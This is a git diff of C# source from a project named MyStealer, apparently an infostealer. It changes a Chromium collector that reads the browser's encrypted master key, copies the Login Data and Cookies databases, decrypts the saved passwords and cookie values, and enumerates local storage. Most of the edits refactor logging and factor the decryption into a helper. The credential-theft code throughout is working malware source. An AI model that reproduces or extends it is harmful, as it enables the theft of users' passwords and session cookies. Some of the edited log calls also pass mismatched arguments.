@@ -1,11 +1,11 @@
-﻿using MyStealer.Utils.Chromium;
+﻿using MyStealer.Utils;
+using MyStealer.Utils.Chromium;
 using Newtonsoft.Json.Linq;
 using Serilog;
 using System;
 using System.Collections.Generic;
 using System.Data.SQLite;
 using System.IO;
-using System.Linq;
 using System.Text;
 
 namespace MyStealer.Collectors.Browser
@@ -13,6 +13,10 @@ namespace MyStealer.Collectors.Browser
     internal class Chromium : IBrowserCollector
     {
         public virtual string ApplicationName => "Chromium";
+
+        private ILogger lazyLogger;
+        public ILogger Logger => lazyLogger ?? (lazyLogger = LogExt.ForModule(ApplicationName));
+
         protected virtual string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Chromium", "User Data");
         protected virtual string[] CookieFilePathList => new string[] { "Cookies", Path.Combine("Network", "Cookies") };
 
@@ -27,7 +31,7 @@ namespace MyStealer.Collectors.Browser
             var localState = JObject.Parse(File.ReadAllText(localStateFile, encoding: Encoding.UTF8));
             decryptor = new ChromiumDecryptor(localState["os_crypt"]["encrypted_key"].Value<string>());
             profileNameList = new HashSet<string>(localState["profile"]["profiles_order"].Values<string>());
-            Log.Debug("Discovered profiles: {profiles}", string.Join(", ", profileNameList));
+            Logger.Debug("Discovered profiles: {profiles}", string.Join(", ", profileNameList));
         }
 
         public ISet<CredentialEntry> GetCredentials()
@@ -69,21 +73,36 @@ namespace MyStealer.Collectors.Browser
             return set;
         }
 
+        private string GetEncryptedString(SQLiteDataReader reader, int i)
+        {
+            var bufferSize = (int)reader.GetBytes(i, 0, null, 0, 0);
+            var buffer = BytePool.Alloc(bufferSize); // the real buffer size may be bigger than `bufferSize`
+            try
+            {
+                reader.GetBytes(i, 0, buffer, 0, bufferSize);
+                return decryptor.Decrypt(bufferSize, buffer);
+            }
+            finally
+            {
+                BytePool.Free(buffer);
+            }
+        }
+
         public ISet<CredentialEntry> DecryptLoginData(string profileName, string loginDataPath)
         {
             var creds = new HashSet<CredentialEntry>();
 
             if (!File.Exists(loginDataPath))
             {
-                Log.Warning("[{moduleName}] (Profile: {profile}) Login Data file does not exists", ApplicationName, profileName);
+                Logger.Warning("({profile}) Login Data file does not exists", ApplicationName, profileName);
                 return creds;
             }
 
-            Log.Information("[{moduleName}] (Profile: {profile}) Begin parsing Login Data file: {path}", ApplicationName, profileName, loginDataPath);
+            Logger.Information("({profile}) Begin parsing Login Data file: {path}", ApplicationName, profileName, loginDataPath);
 
             var copyName = Path.GetRandomFileName();
             File.Copy(loginDataPath, copyName, true); // prevent reading locked sql database
-            Log.Debug("[{moduleName}] (Profile: {profile}) Login Data file {path} copied to {randomName}", ApplicationName, profileName, loginDataPath, copyName);
+            Logger.Debug("({profile}) Login Data file {path} copied to {randomName}", profileName, loginDataPath, copyName);
 
             try
             {
@@ -98,10 +117,7 @@ namespace MyStealer.Collectors.Browser
                         {
                             var host = reader.GetString(0);
                             var username = reader.GetString(1);
-                            var bufferSize = (int)reader.GetBytes(2, 0, null, 0, 0);
-                            var buffer = new byte[bufferSize];
-                            reader.GetBytes(2, 0, buffer, 0, bufferSize);
-                            var password = decryptor.Decrypt(buffer);
+                            var password = GetEncryptedString(reader, 2);
 
                             if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(username))
                             {
@@ -109,7 +125,7 @@ namespace MyStealer.Collectors.Browser
                                 {
                                     ApplicationName = $"{ApplicationName}",
                                     ApplicationProfileName = profileName,
-                                    Url = host,
+                                    Host = host,
                                     UserName = username,
                                     Password = password
                                 });
@@ -120,13 +136,13 @@ namespace MyStealer.Collectors.Browser
             }
             catch (Exception e)
             {
-                Log.Warning(e, "[{moduleName}] (Profile: {profile}) Error reading login entries", ApplicationName, profileName);
+                Logger.Warning(e, "(Profile: {profile}) Error reading login entries",  profileName);
                 return creds;
             }
             finally
             {
                 File.Delete(copyName);
-                Log.Information("[{moduleName}] (Profile: {profile}) Read {n} login entries", ApplicationName, profileName, creds.Count);
+                Logger.Information("(Profile: {profile}) Read {n} login entries",  profileName, creds.Count);
             }
 
             return creds;
@@ -138,15 +154,15 @@ namespace MyStealer.Collectors.Browser
 
             if (!File.Exists(cookieFile))
             {
-                Log.Warning("[{moduleName}] (Profile: {profile}) Cookies file does not exists: {path}", ApplicationName, profileName, cookieFile);
+                Logger.Warning("(Profile: {profile}) Cookies file does not exists: {path}", profileName, cookieFile);
                 return cookies;
             }
 
-            Log.Information("[{moduleName}] (Profile: {profile}) Begin parsing Cookies file: {path}", ApplicationName, profileName, cookieFile);
+            Logger.Information("(Profile: {profile}) Begin parsing Cookies file: {path}", profileName, cookieFile);
 
             var copyName = Path.GetRandomFileName();
             File.Copy(cookieFile, copyName, true); // prevent reading locked sql database
-            Log.Debug("[{moduleName}] (Profile: {profile}) Login Data file {path} copied to {randomName}", ApplicationName, profileName, cookieFile, copyName);
+            Logger.Debug("(Profile: {profile}) Login Data file {path} copied to {randomName}", profileName, cookieFile, copyName);
 
             try
             {
@@ -169,12 +185,8 @@ namespace MyStealer.Collectors.Browser
                             var path = reader.GetString(7);
                             var value = reader.GetString(8); // legacy value
                             if (value.Length == 0)
-                            {
-                                var bufferSize = (int)reader.GetBytes(9, 0, null, 0, 0);
-                                var buffer = new byte[bufferSize];
-                                reader.GetBytes(9, 0, buffer, 0, bufferSize);
-                                value = decryptor.Decrypt(buffer);
-                            }
+                                value = GetEncryptedString(reader, 9);
+
                             var isSecure = reader.GetInt16(10);
                             var isHttpOnly = reader.GetInt16(11);
 
@@ -214,13 +226,13 @@ namespace MyStealer.Collectors.Browser
             }
             catch (Exception e)
             {
-                Log.Warning(e, "[{moduleName}] (Profile: {profile}) Error reading cookie entries", ApplicationName, profileName);
+                Logger.Warning(e, "(Profile: {profile}) Error reading cookie entries", ApplicationName, profileName);
                 return cookies;
             }
             finally
             {
                 File.Delete(copyName);
-                Log.Information("[{moduleName}] (Profile: {profile}) Read {n} cookie entries", ApplicationName, profileName, cookies.Count);
+                Logger.Information("(Profile: {profile}) Read {n} cookie entries", ApplicationName, profileName, cookies.Count);
             }
 
             return cookies;
@@ -231,7 +243,7 @@ namespace MyStealer.Collectors.Browser
             var set = new HashSet<LocalStorageEntry>();
             var localStorageDb = new CclChromiumLocalStorage.LocalStoreDb(levelDbPath);
 
-            foreach (var record in localStorageDb.iter_all_records())
+            foreach (var record in localStorageDb.EnumerateRecords())
             {
                 var batch = localStorageDb.FindBatch(record.Seq);
                 var timeStamp = DateTime.MinValue;
